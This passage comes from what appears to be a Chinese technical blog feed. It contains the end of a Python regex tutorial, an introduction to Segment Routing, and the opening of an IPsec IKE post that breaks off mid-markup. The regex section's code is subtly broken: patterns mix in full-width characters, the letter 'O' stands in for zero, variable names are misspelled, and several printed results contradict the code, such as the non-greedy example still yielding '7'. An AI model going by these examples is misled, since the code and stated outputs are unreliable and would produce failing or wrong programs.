)</td><td>匹配括号内的表达式，也表示一个组</td></tr></tbody></table><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h3 id="match"><a href="#match" class="headerlink" title="match()"></a>match()</h3><p>match （）方法会尝试从字符串的起始位置匹配正则表达式，如果匹配，就返回匹配成功的结果；如<br>果不匹配，就返回none 。</p><p>例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent <span class="token operator">=</span><span class="token string">'Hello 1234567 World_This is a Regex Demo'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>match <span class="token punctuation">(</span><span class="token string">'^Hello\s(\d+)\sWord'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 默认为group(0) 即匹配能匹配到的所有内容</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># group(1)可匹配正则表达式中第一个（）中的内容</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>span<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>_sre<span class="token punctuation">.</span>SRE_Match <span class="token builtin">object</span><span class="token punctuation">;</span> span<span class="token operator">=</span><span class="token punctuation">(</span>O<span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">,</span> match <span class="token operator">=</span><span class="token string">'Hello 1234567 World'</span><span class="token operator">></span>Hello <span class="token number">1234567</span> World<span class="token number">1234567</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>SRE_Match对象有两个方法：</strong></p><ul><li>group()方法可以输出匹配到的内容</li><li>span()方法可以输出匹配的范围</li></ul><h3 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h3><p>前面提到过， match （）方法是从字符串的开头开始匹配的，一旦开头不匹配，那么整个匹配就失败<br>了。我们看下面的例子：</p><p>例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent<span class="token operator">=</span> <span class="token string">'Extra stings Hello 1234567 World This is a Regex Demo Extra stings '</span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>match <span class="token punctuation">(</span><span class="token string">'Hello.*?（＼d+）.*?Demo'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里的字符串以Extra 开头，但是正则表达式以Hello 开头，整个正则表达式是字符串的一部分，但是这样匹配是失败的。</p><p>因为match ()方法在使用时需要考虑到开头的内容，这在做匹配时并不方便。它更适合用来检测某个字符串是存符合某个正则表达式的规则。</p><p><strong>这里就有另外一个方法search ()，它在匹配时会扫描整个字符串，然后返回第一个成功匹配的结果。也就是说，正则表达式可以是字符串的一部分，在匹配时， search()方法会依次扫描字符串，直到找到第一个符合规则的字符串，然后返回匹配内容，如果搜索完了还没有找到，就返回None 。</strong></p><p>把上面的代码改为：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent<span class="token operator">=</span> <span class="token string">'Extra stings Hello 1234567 World This is a Regex Demo Extra stings '</span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>search <span class="token punctuation">(</span><span class="token string">'Hello.*?（＼d+）.*?Demo'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1234567</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="findall"><a href="#findall" class="headerlink" title="findall()"></a>findall()</h3><p>search ()方法的用法，它可以返回匹配正则表达式的第一个内容，但是如果想要获取匹配正则表达式的所有内容，那该怎么办呢？这时就要借助findall ()方法了。</p><p>findall ()方法会搜索整个字符串，然后返回匹配正则表达式的所有内容。</p><p>例：</p><p>这里有一段待匹配的HTML文本：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">html ＝```＜div id="songs-list"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>经典老歌<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>introduction<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>经典老歌列表<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>list-group<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">data-view</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>一路上有你<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">data-view</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>7<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;a href ＝"/2.mp3" singer ＝"任贤齐">沧海一卢笑<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">data-view</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;a href ＝"/3.mp3" singer ＝"齐泰">往事随风<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">data-view</span> <span class="token attr-name">＝"6"＞</span>    <span class="token attr-name">&lt;a</span> <span class="token attr-name">href</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/4.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">singer</span> <span class="token attr-name">＝"beyond"</span><span class="token punctuation">></span></span>光辉岁月<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>```<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">results <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">'&lt;li.*?href＝"(.＊?)".*?singer="（.*?）"＞（.*?）&lt;/a>'</span><span class="token punctuation">,</span>html<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>results<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span>o<span class="token punctuation">]</span><span class="token punctuation">,</span> result<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> result<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">［（<span class="token string">'/2.mp3'</span>，<span class="token string">'任贤齐'</span>， <span class="token string">'沧海一卢笑'</span>）<span class="token punctuation">,</span>（<span class="token string">'/3.mp3'</span>，<span class="token string">'齐泰'</span>，<span class="token string">'往事随风'</span>）<span class="token punctuation">,</span>（<span class="token string">'/4.mp3'</span><span class="token punctuation">,</span> <span class="token string">'beyond'</span>，<span class="token string">'尤辉岁月'</span>）］<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">></span>（<span class="token string">'/2.mp3'</span>，<span class="token string">'任贤齐'</span>， <span class="token string">'沧海一卢笑'</span>）（<span class="token string">'/3.mp3'</span>，<span class="token string">'齐泰'</span>，<span class="token string">'往事随风'</span>）（<span class="token string">'/4.mp3'</span><span class="token punctuation">,</span> <span class="token string">'beyond'</span>，<span class="token string">'尤辉岁月'</span>）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，返回的列表中的每个元素都是元组类型，我们用对应的索引依次取出即可。</p><p>如果只是获取第一个内容，可以用search ()方法。当需要提取多个内容时，可以用于findall()方法。</p><h3 id="complie"><a href="#complie" class="headerlink" title="complie()"></a>complie()</h3><p>complie方法可以将正则字符串编译成正则表达式对象，以便在后面的匹配中复用。</p><p>例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontentl <span class="token operator">=</span><span class="token string">'2016 12 15 12:00'</span>content2 <span class="token operator">=</span><span class="token string">'2016-12-17 12:55'</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'\d&#123;2&#125;:\d&#123;2&#125;'</span><span class="token punctuation">)</span>resultl <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> '’<span class="token punctuation">,</span>contentl<span class="token punctuation">)</span>result2 <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span>content2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>reslt1<span class="token punctuation">,</span> result2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">2016</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">15</span>  <span class="token number">2016</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">17</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如，这里有2个日期，我们想分别将2个日期中的时间去掉，这时可以借助<strong>sub ()**方法。该方法的第一个参数是正则表达式，但是这里没有必要重复写32个同样的正则表达式，此时可以借助</strong>compile ()**方法将正则表达式编译成一个正则表达式对象，以便复用。</p><blockquote><p>sub()方法的使用请自行查阅，这个方法用的比较少。</p></blockquote><h2 id="贪婪与非贪婪"><a href="#贪婪与非贪婪" class="headerlink" title="贪婪与非贪婪"></a>贪婪与非贪婪</h2><p>例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent <span class="token operator">=</span> <span class="token string">'Hello 1234567 World_This is a Regex Demo'</span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>match <span class="token punctuation">(</span><span class="token string">'&lt; He.*(\d+).*Demo$'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>只得到了<code>7</code>这个数字，并没有得到我们想要的<code>12345678</code></p><p>因为在贪婪匹配下，<code>.*</code>会匹配尽可能多的字符。正则表达式中<code>.*</code>后面是<code>\d＋</code>，也就是至少一个数字，并没有指定具体多少个数字，因此，<code>.*</code> 就尽可能匹配多的字符，这里就把<code>123456</code> 匹配了，给<code>\d＋</code>留下一个可满足条件的数字<code>7</code> ，最后得到的内容就只有数字<code>7</code>了。</p><p>为了到达想要的效果只能使用非贪婪模式，非贪婪模式匹配的写法是<code>.*?</code>，多了个<code>?</code>就可以达到想要的效果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent <span class="token operator">=</span> <span class="token string">'Hello 1234567 World_This is a Regex Demo'</span>result <span class="token operator">=</span> re<span class="token punctuation">.</span>match <span class="token punctuation">(</span><span class="token string">'&lt; He.*?(\d+).*Demo$'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">7</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。</p><p>我们用实例来看一下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> recontent <span class="token operator">=</span> ```Hello <span class="token number">1234567</span> World_This <span class="token keyword">is</span> a Regex Demo```result <span class="token operator">=</span> re<span class="token punctuation">.</span>match <span class="token punctuation">(</span><span class="token string">'&lt; He.*?(\d+).*Demo$'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">AttributeError Traceback <span class="token punctuation">(</span>most recent call lastAttributeError<span class="token punctuation">:</span> Non eType <span class="token builtin">object</span> has no attribute group<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行直接报错，也就是说正则表达式没有匹配到这个字符串，返回结果为None ，而我们又调用了group ()方法导致Attribute Error 。</p><p>原因是待匹配内容中有<strong>换行</strong>，导致正则无法匹配，这里只需加一个修饰符<code>re.S</code> ，即可修正这个错误：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">result <span class="token operator">=</span> re<span class="token punctuation">.</span>match <span class="token punctuation">(</span><span class="token string">'&lt; He.*?(\d+).*Demo$'</span><span class="token punctuation">,</span>content<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>常用修饰符：</strong></p><table><thead><tr><th>修饰符</th><th>描述</th></tr></thead><tbody><tr><td>re.I</td><td>使匹配对大小写不敏感</td></tr><tr><td>re.L</td><td>做本地化识别（ locale-aware ）匹配</td></tr><tr><td>re.M</td><td>多行匹配，影响^和$</td></tr><tr><td>re.S</td><td>使.匹配包括换行在内的所有字符</td></tr><tr><td>re.U</td><td>根据Unicode 字符集解析字符。这个标志影响W 、\W 、\b 和\B</td></tr><tr><td>re.X</td><td>该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>segment Routing简介</title>
      <link href="2019/03/30/segment-Routing/"/>
      <url>2019/03/30/segment-Routing/</url>
      
        <content type="html"><![CDATA[<h1 id="segment-Routing简介"><a href="#segment-Routing简介" class="headerlink" title="segment Routing简介"></a>segment Routing简介</h1><p><strong>segment routing</strong> 是基于源路由技术理念设计的一种在网络上转发数据包的协议。它将代表转发路径的序列号编码在数据包头部使用IGP或BGP协议进行传递，沿途设备收到数据包后解码头部的信息，如果头部标识和自己的标识相同则弹出这个标识进行下一步处理，如果不相同则按照ECMP转发数据包。</p><p><strong>源路由</strong>：用户可以指定起始节点某一数据包到达目的地所经过的路径，中间节点只需按照定义好的规则进行转发即可，不必关心目的地在哪，如何到达目的地。源路由技术的这种特点，可以应用在在SDN,TE等领域。</p><h2 id="segment-routing的驱动力："><a href="#segment-routing的驱动力：" class="headerlink" title="segment routing的驱动力："></a>segment routing的驱动力：</h2><ol><li>网络业务种类越来越复杂，不同种类的业务对网络的要求不同，比如语音，视频等业务需要低延迟，下载业务需要高带宽。传统的网络解决方法配置复杂，适用性差。</li><li>segment routing可以配合现在提出的业务驱动网络的思想，使得端到端路径控制更加简单和易于实现。</li><li>Ip网络中mpls的应，如mpls vpn，mpls-TE等的控制平面需要单独的协议LDP或者RSVP，控制报文占用带宽，控制平面复杂。SR技术可以简化mpls的控制平面，直接使用IGP传递SID无需单独的隧道协议。</li><li>IPV6已是大势所趋，segment routing在IPV6中的应用更为简单。</li><li>提供高效TI-LFA（Topology-Independent Loop-free Alternate） FRR保护，实现路径故障的快速恢复。</li><li>Segment Routing同时支持传统网络和SDN网络，兼容现有设备，保障现有网络平滑演进到SDN网络。</li></ol><h2 id="segment-routing的几个概念："><a href="#segment-routing的几个概念：" class="headerlink" title="segment routing的几个概念："></a>segment routing的几个概念：</h2><ul><li>SR域（Segment Routing Domain）：SR节点的集合。</li><li>SID：即Segment ID，用来标识唯一的段。在转发层面，可以映射为MPLS标签。</li><li>SRGB（Segment Routing Global Block）：用户指定的为Segment Routing预留的本地标签集合。</li></ul><h2 id="Segment-分类："><a href="#Segment-分类：" class="headerlink" title="Segment 分类："></a>Segment 分类：</h2><ul><li><p>PrefixSegment（前缀段）：<br>Prefix Segment用于标识网络中的某个目的地址前缀（Prefix）。Prefix Segment通过IGP协议扩散到其他网元，全局可见，全局有效。<br>Prefix Segment通过Prefix Segment ID（SID）标识。Prefix SID是源端发布的SRGB范围内的偏移值，接收端会根据自己的SRGB计算实际标签值用于生成MPLS转发表项。</p></li><li><p>AdjacencySegment（邻接段）：<br>Adjacency Segment用于标识网络中的某个邻接。Adjacency Segment通过IGP协议扩散到其他网元，全局可见，本地有效。<br>Adjacency Segment通过Adjacency Segment ID（SID）标识。Adjacency SID为SRGB范围外的本地SID。</p></li><li><p>NodeSegment（节点段）：<br>Node Segment是特殊的Prefix Segment，用于标识特定的节点（Node）。在节点的Loopback接口下配置IP地址作为前缀，这个节点的Prefix SID实际就是NodeSID。</p></li></ul><h3 id="PrefixSegment"><a href="#PrefixSegment" class="headerlink" title="PrefixSegment"></a>PrefixSegment</h3><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-03-26-11-10-09.png"></p><p>prefixSegment的转发路径是通过IGP的SPF算法计算出来的，如图所示：Z节点的prefix SID通过IGP扩散出去后每个节点都可以学习到，每个节点也可以通过spf计算出到达Z的cost值。当数据包从A传递到Z时，在网络中既可以存在等价路径也可以存在主备链路。所以基于PrefixSegment的转发路径不是固定的，头结点已无法控制报文的转发路径。</p><h3 id="AdjacenySengment"><a href="#AdjacenySengment" class="headerlink" title="AdjacenySengment"></a>AdjacenySengment</h3><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-03-26-11-13-58.png" alt="AdjacenySengment"></p><p>Adjacency SID是由邻居分配给上游节点的，类似于MPLS lable。<br>通过给网络中每个邻接分配一个Adjacency Segment，然后在头节点定义一个包含多个Adjacency Segment的Segment List，就可以严格指定任意一条显式路径（Strict Explicit）。这种方式可以更好的配合实现SDN。</p><h3 id="NodeSgment"><a href="#NodeSgment" class="headerlink" title="NodeSgment"></a>NodeSgment</h3><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-03-26-11-14-36.png" alt="NodeSgment"></p><p>基于Adjacency Segment + Node Segment 的转发路径, NodeSID是一种特殊的PrefixSID,所以这种转发方式和上一种其实差不多。<br>这种方式是将Adjacency Segment和Node Segment结合，通过AdjacencySegment，可以强制整条路径包含某一个邻接。而对于Node Segment，节点可以使用SPF算法计算最短路径，也可以负载分担。<br>如图：D-E使用了Adjacency Segment控制数据包的走向，其它节点则基于NodeSegment计算最短路径。</p><h2 id="SR转发机制"><a href="#SR转发机制" class="headerlink" title="SR转发机制"></a>SR转发机制</h2><p>SR在IPv4中的应用是基于mpls网络的，SR可以直接应用在MPLS架构，转发机制没有变化。代表段的SID被编码为MPLS标签。段序列被编码为标签栈。要处理的段位于栈顶。一个段处理完成后，相关标签从标签栈中弹出。</p><p>和mpls相同在转发数据包之前需要先建立转发路径LSP，在segment routing中叫做SR LSP。由一个Prefix或Node Segment指导数据包转发。<br>SR-BE（Segment Routing Best Effort）是指IGP使用最短路径算法计算得到的最优SR LSP。</p><h3 id="SR-LSP的创建"><a href="#SR-LSP的创建" class="headerlink" title="SR LSP的创建"></a>SR LSP的创建</h3><ul><li>网络拓扑上报（这个步骤当有控制器的时候才需要）</li><li>标签分配</li><li>路径计算</li></ul><p>对于SR LSP，主要基于前缀标签创建。目的节点通过IGP协议发布Prefix SID，转发器解析Prefix SID，并根据自己的SRGB计算标签值。此后各节点使用IGP协议收集的拓扑信息，根据最短路径算法计算标签转发路径，并将计算的下一跳及出标签（OuterLabel）信息下发转发表，指导数据报文转发。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-03-26-11-17-13.png"></p><h3 id="LSP具体创建过程："><a href="#LSP具体创建过程：" class="headerlink" title="LSP具体创建过程："></a>LSP具体创建过程：</h3><ol><li>在D上配置SRGB，在D的Loopback口配置Prefix SID，生成转发表项并下发。之后D将SRGB和Prefix SID封装到LSP报文（如包含SR-CapabilitiesSub-TLV的IS-IS Router Capability TLV-242），并将LSP报文通过IGP向全网扩散。网络中其他设备接收到LSP报文后，解析D发布的Prefix SID，根据自己的SRGB计算标签值，同时根据下一跳节点发布的SRGB计算出标签值（OuterLabel）。使用IGP拓扑计算标签转发路径，然后生成转发表项。</li><li>C设备解析D发布的Prefix SID，根据自己的SRGB=[36000–65535]计算标签值，计算公式是：Label=SRGB的起始值+Prefix SID值，所以Label=36000+100=36100。使用IS-IS拓扑计算出标签（OuterLabel），计算公式是：OuterLabel=下一跳设备发布的SRGB的起始值+Prefix SID值，在本例中，下一跳设备为D，D发布的SRGB范围是[16000–65535]，所以<br>OuterLabel=16000+100=16100。</li><li>B和A的计算过程与前面相同。</li></ol><h3 id="数据转发"><a href="#数据转发" class="headerlink" title="数据转发"></a>数据转发</h3><p>当LSP建立完成，每个节点都有对应的标签信息后，开始转发数据包。数据包的转发过程和mpls的相同，数据按照头部（2.5层）的标签信息和标签动作进行转发。</p><p>标签动作分为：push，switch，pop 三种。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/2019-03-26-11-17-41.png"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>segment Routing的lsp建立，数据转发过程基本和mpls的相同。不同点在于控制平面直接使用IGP协议，而mpls需要单独的控制协议。标签生成方式和mpls略有不同。</p><p>segmentRouting和mpls一样也有PHP和TTL处理机制（这里不再细说，有兴趣的可以去看下，其实和mpls的原理也基本相同）</p><p>segmentRouting相对于mpls来说其优点在于可以结合控制器来做更精细化的流量管理，加快业务部署，平滑演进SDN（目前SDN网络中主要还在用VXLAN）。</p>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 路由协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> segmentRouting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPsec VPN中IKE协议的理解</title>
      <link href="2019/03/02/ipsec-vpn-ike/"/>
      <url>2019/03/02/ipsec-vpn-ike/</url>
      
        <content type="html"><![CDATA[<h1 id="IKE协议"><a href="#IKE协议" class="headerlink" title="IKE协议"></a>IKE协议</h1><p>在IPsec VPN中，对等体之间如果要建立起IPsec连接，首先需要建立IPsec安全联盟（IPsec SA）。IPsec SA是双向的，即每个对等体和对方分别建立IPsec SA，IPsec SA的建立可以手工配置也可以使用IKE协议来自动协商。二者的主要区别为：</p><ul><li><p>密钥生成方式不同</p><p>手工方式下，建立SA所需的全部参数，包括加密、验证密钥，都需要用户手工配置，也只能手工刷新，在中大型网络中，这种方式的密钥管理成本很高；IKE方式下，建立SA需要的加密、验证密钥是通过DH算法生成的，可以动态刷新，因而密钥管理成本低，且安全性较高。</p></li><li><p>生存周期不同</p><p>手工方式建立的SA，一经建立永久存在；IKE方式建立的SA，其生存周期由双方配置的生存周期参数控制。</p></li></ul><p>手工配置适用于网络简单，连接稳定的环境中，IKE方式适用于大部分场景且更加安全。</p><p>因特网密钥交换IKE（Internet Key Exchange）协议建立在Internet安全联盟和密钥管理协议ISAKMP定义的框架上，是基于UDP（User Datagram Protocol）的应用层协议。它为IPSec提供了自动协商密钥、建立IPSec安全联盟的服务，能够简化IPSec的使用和管理，大大简化IPSec的配置和维护工作。</p><p>上面只是大概介绍了IKE，在真正理解IKE之前，请先理解下面的概念：</p><h2 id="安全联盟（SA）"><a href="#安全联盟（SA）" class="headerlink" title="安全联盟（SA）"></a>安全联盟（SA）</h2><p>SA由一个三元组来唯一标识，这个三元组包括安全参数索引SPI（Security Parameter Index）、目的IP地址和使用的安全协议号（AH或ESP）。其中，SPI是为唯一标识SA而生成的一个32位比特的数值，它在AH和ESP头中传输。在手工配置SA时，需要手工指定SPI的取值。使用IKE协商产生SA时，SPI将随机生成。</p><p>SA是单向的逻辑连接，因此两个IPSec对等体之间的双向通信，最少需要建立两个SA来分别对两个方向的数据流进行安全保护。如下图所示，为了在对等体A和对等体B之间建立IPSec隧道，需要建立两个安全联盟，其中，SA1规定了从对等体A发送到对等体B的数据采取的保护方式，SA2规定了从对等体B发送到对等体A的数据采取的保护方式。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/fig_dc_fd_ipsec_002301_ar.png" alt="fig_dc_fd_ipsec_002301_ar.png"></p><h2 id="加密和验证"><a href="#加密和验证" class="headerlink" title="加密和验证"></a>加密和验证</h2><p>在理解IKE之前需要先了解下加密和认证。加密是为了给数据包加密，即使黑客截获了数据包也无法解密。认证是为了验证对方是否是合法的身份，防止黑客伪造对等体身份。IPsec是如何实现这两种功能的呢？</p><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>对称加密就是加密方和解密方使用同一个秘钥。只有知道加密方是使用何种加密方式和使用的秘钥，解密方才能进行解密。</p><p>举个例子：<br>在战争年代，小明和小红都做着绝密工作，小明和小红需要频繁通信，他们怕通信内容被敌人截获于是约定将他们收到的内容的<strong>英文字母全部向后移两位</strong>就是最终的结果。比如收到的是A，那么实际为C。这里<strong>向后移</strong>就是加密算法，<strong>两</strong>就是秘钥。只有当两人都知道这个算法和秘钥时，他们收到对方的信息才能正确解密。</p><p>目前常见的对称加密算法有：DES，3DES，AES等。</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" 